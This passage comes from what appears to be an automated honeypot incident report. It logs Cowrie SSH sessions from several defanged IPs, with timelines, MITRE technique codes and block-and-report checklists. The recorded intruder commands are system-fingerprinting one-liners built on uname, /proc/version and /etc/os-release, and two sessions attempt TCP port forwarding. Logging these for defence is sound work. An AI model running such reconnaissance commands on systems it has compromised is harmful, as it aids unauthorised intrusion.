| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:24:18` | `cowrie.session.connect` |
| `2026-08-11 13:24:19` | `cowrie.client.version` |
| `2026-08-11 13:24:19` | `cowrie.client.kex` |
| `2026-08-11 13:24:20` | `cowrie.login.success` |
| `2026-08-11 13:24:21` | `cowrie.session.params` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.success` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.command.input` |
| `2026-08-11 13:24:21` | `cowrie.log.closed` |
| `2026-08-11 13:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bf3b92b56b9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:25 |
| **Last Seen** | 2026-08-11 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:25:27` | `cowrie.session.connect` |
| `2026-08-11 13:25:27` | `cowrie.client.version` |
| `2026-08-11 13:25:27` | `cowrie.client.kex` |
| `2026-08-11 13:25:27` | `cowrie.login.success` |
| `2026-08-11 13:25:28` | `cowrie.session.params` |
| `2026-08-11 13:25:28` | `cowrie.command.input` |
| `2026-08-11 13:25:28` | `cowrie.log.closed` |
| `2026-08-11 13:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2371b2e08fb6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:25 |
| **Last Seen** | 2026-08-11 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:25:50` | `cowrie.session.connect` |
| `2026-08-11 13:25:50` | `cowrie.client.version` |
| `2026-08-11 13:25:50` | `cowrie.client.kex` |
| `2026-08-11 13:25:51` | `cowrie.login.success` |
| `2026-08-11 13:25:51` | `cowrie.session.params` |
| `2026-08-11 13:25:51` | `cowrie.command.input` |
| `2026-08-11 13:25:51` | `cowrie.log.closed` |
| `2026-08-11 13:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3dc35560d27

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:26 |
| **Last Seen** | 2026-08-11 13:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:26:10` | `cowrie.session.connect` |
| `2026-08-11 13:26:11` | `cowrie.client.version` |
| `2026-08-11 13:26:11` | `cowrie.client.kex` |
| `2026-08-11 13:26:12` | `cowrie.login.success` |
| `2026-08-11 13:26:13` | `cowrie.session.params` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.success` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:13` | `cowrie.command.input` |
| `2026-08-11 13:26:14` | `cowrie.log.closed` |
| `2026-08-11 13:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a50cb6e72a3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:27 |
| **Last Seen** | 2026-08-11 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:27:16` | `cowrie.session.connect` |
| `2026-08-11 13:27:16` | `cowrie.client.version` |
| `2026-08-11 13:27:16` | `cowrie.client.kex` |
| `2026-08-11 13:27:16` | `cowrie.login.success` |
| `2026-08-11 13:27:17` | `cowrie.session.params` |
| `2026-08-11 13:27:17` | `cowrie.command.input` |
| `2026-08-11 13:27:17` | `cowrie.log.closed` |
| `2026-08-11 13:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7994c96c9919

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:27 |
| **Last Seen** | 2026-08-11 13:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:27:58` | `cowrie.session.connect` |
| `2026-08-11 13:27:58` | `cowrie.client.version` |
| `2026-08-11 13:27:58` | `cowrie.client.kex` |
| `2026-08-11 13:28:00` | `cowrie.login.success` |
| `2026-08-11 13:28:01` | `cowrie.session.params` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.success` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.command.input` |
| `2026-08-11 13:28:01` | `cowrie.log.closed` |
| `2026-08-11 13:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a00b75335728

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:28 |
| **Last Seen** | 2026-08-11 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:28:35` | `cowrie.session.connect` |
| `2026-08-11 13:28:35` | `cowrie.client.version` |
| `2026-08-11 13:28:36` | `cowrie.client.kex` |
| `2026-08-11 13:28:36` | `cowrie.login.success` |
| `2026-08-11 13:28:37` | `cowrie.session.params` |
| `2026-08-11 13:28:37` | `cowrie.command.input` |
| `2026-08-11 13:28:37` | `cowrie.log.closed` |
| `2026-08-11 13:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c213c07bad2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:29 |
| **Last Seen** | 2026-08-11 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:29:00` | `cowrie.session.connect` |
| `2026-08-11 13:29:00` | `cowrie.client.version` |
| `2026-08-11 13:29:00` | `cowrie.client.kex` |
| `2026-08-11 13:29:01` | `cowrie.login.success` |
| `2026-08-11 13:29:01` | `cowrie.session.params` |
| `2026-08-11 13:29:01` | `cowrie.command.input` |
| `2026-08-11 13:29:02` | `cowrie.log.closed` |
| `2026-08-11 13:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5340a1c25368

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:29 |
| **Last Seen** | 2026-08-11 13:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:29:48` | `cowrie.session.connect` |
| `2026-08-11 13:29:49` | `cowrie.client.version` |
| `2026-08-11 13:29:49` | `cowrie.client.kex` |
| `2026-08-11 13:29:49` | `cowrie.login.success` |
| `2026-08-11 13:29:50` | `cowrie.session.params` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.success` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:50` | `cowrie.command.input` |
| `2026-08-11 13:29:51` | `cowrie.log.closed` |
| `2026-08-11 13:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab34cebe5e5f

| Field | Detail |
|---|---|
| **Source IP** | `190.57.233[.]133` |
| **First Seen** | 2026-08-11 13:30 |
| **Last Seen** | 2026-08-11 13:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:30:21` | `cowrie.session.connect` |
| `2026-08-11 13:30:22` | `cowrie.client.version` |
| `2026-08-11 13:30:22` | `cowrie.client.kex` |
| `2026-08-11 13:30:24` | `cowrie.login.success` |
| `2026-08-11 13:30:25` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.57.233[.]133` to AbuseIPDB if not already reported
- [ ] Block `190.57.233[.]133` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9663e8f4ca7b

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-08-11 13:30 |
| **Last Seen** | 2026-08-11 13:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:30:30` | `cowrie.session.connect` |
| `2026-08-11 13:30:31` | `cowrie.client.version` |
| `2026-08-11 13:30:31` | `cowrie.client.kex` |
| `2026-08-11 13:30:33` | `cowrie.login.success` |
| `2026-08-11 13:30:34` | `cowrie.direct-tcpip.request` |
| `2026-08-11 13:30:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b4d58a404a1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:30 |
| **Last Seen** | 2026-08-11 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:30:35` | `cowrie.session.connect` |
| `2026-08-11 13:30:35` | `cowrie.client.version` |
| `2026-08-11 13:30:35` | `cowrie.client.kex` |
| `2026-08-11 13:30:35` | `cowrie.login.success` |
| `2026-08-11 13:30:36` | `cowrie.session.params` |
| `2026-08-11 13:30:36` | `cowrie.command.input` |
| `2026-08-11 13:30:36` | `cowrie.log.closed` |
| `2026-08-11 13:30:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c74b1c22f6ce

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:31 |
| **Last Seen** | 2026-08-11 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:31:16` | `cowrie.session.connect` |
| `2026-08-11 13:31:16` | `cowrie.client.version` |
| `2026-08-11 13:31:16` | `cowrie.client.kex` |
| `2026-08-11 13:31:17` | `cowrie.login.success` |
| `2026-08-11 13:31:18` | `cowrie.session.params` |
| `2026-08-11 13:31:18` | `cowrie.command.input` |
| `2026-08-11 13:31:18` | `cowrie.log.closed` |
| `2026-08-11 13:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e7db6e2a1de

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:31 |
| **Last Seen** | 2026-08-11 13:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:31:39` | `cowrie.session.connect` |
| `2026-08-11 13:31:39` | `cowrie.client.version` |
| `2026-08-11 13:31:39` | `cowrie.client.kex` |
| `2026-08-11 13:31:41` | `cowrie.login.success` |
| `2026-08-11 13:31:42` | `cowrie.session.params` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.success` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.command.input` |
| `2026-08-11 13:31:42` | `cowrie.log.closed` |
| `2026-08-11 13:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0611041d5889

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:32 |
| **Last Seen** | 2026-08-11 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:32:11` | `cowrie.session.connect` |
| `2026-08-11 13:32:11` | `cowrie.client.version` |
| `2026-08-11 13:32:11` | `cowrie.client.kex` |
| `2026-08-11 13:32:12` | `cowrie.login.success` |
| `2026-08-11 13:32:12` | `cowrie.session.params` |
| `2026-08-11 13:32:12` | `cowrie.command.input` |
| `2026-08-11 13:32:12` | `cowrie.log.closed` |
| `2026-08-11 13:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f27739cbfe8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-11 13:33 |
| **Last Seen** | 2026-08-11 13:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:33:32` | `cowrie.session.connect` |
| `2026-08-11 13:33:32` | `cowrie.client.version` |
| `2026-08-11 13:33:32` | `cowrie.client.kex` |
| `2026-08-11 13:33:33` | `cowrie.login.success` |
| `2026-08-11 13:33:34` | `cowrie.session.params` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.success` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:34` | `cowrie.command.input` |
| `2026-08-11 13:33:35` | `cowrie.log.closed` |
| `2026-08-11 13:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07a554ba0772

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:33 |
| **Last Seen** | 2026-08-11 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:33:47` | `cowrie.session.connect` |
| `2026-08-11 13:33:47` | `cowrie.client.version` |
| `2026-08-11 13:33:47` | `cowrie.client.kex` |
| `2026-08-11 13:33:48` | `cowrie.login.success` |
| `2026-08-11 13:33:49` | `cowrie.session.params` |
| `2026-08-11 13:33:49` | `cowrie.command.input` |
| `2026-08-11 13:33:49` | `cowrie.log.closed` |
| `2026-08-11 13:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9ffc78219d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-08-11 13:33 |
| **Last Seen** | 2026-08-11 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:33:59` | `cowrie.session.connect` |
| `2026-08-11 13:33:59` | `cowrie.client.version` |
| `2026-08-11 13:33:59` | `cowrie.client.kex` |
| `2026-08-11 13:33:59` | `cowrie.login.success` |
| `2026-08-11 13:34:00` | `cowrie.session.params` |
| `2026-08-11 13:34:00` | `cowrie.command.input` |
| `2026-08-11 13:34:00` | `cowrie.log.closed` |
| `2026-08-11 13:34:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273f7c5665df

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 13:35 |
| **Last Seen** | 2026-08-11 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:35:00` | `cowrie.session.connect` |
| `2026-08-11 13:35:00` | `cowrie.client.version` |
| `2026-08-11 13:35:00` | `cowrie.client.kex` |
| `2026-08-11 13:35:01` | `cowrie.login.success` |
| `2026-08-11 13:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04f6296d80e8

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-11 13:35 |
| **Last Seen** | 2026-08-11 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 13:35:00` | `cowrie.session.connect` |
| `2026-08-11 13:35:00` | `cowrie.client.version` |
| `2026-08-11 13:35:00` | `cowrie.client.kex` |
| `2026-08-11 13:35:01` | `cowrie.login.success` |
| `2026-08-11 13:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-936c7888e569

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-08-11 13:35 |
| **Last Seen** | 2026-08-11 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
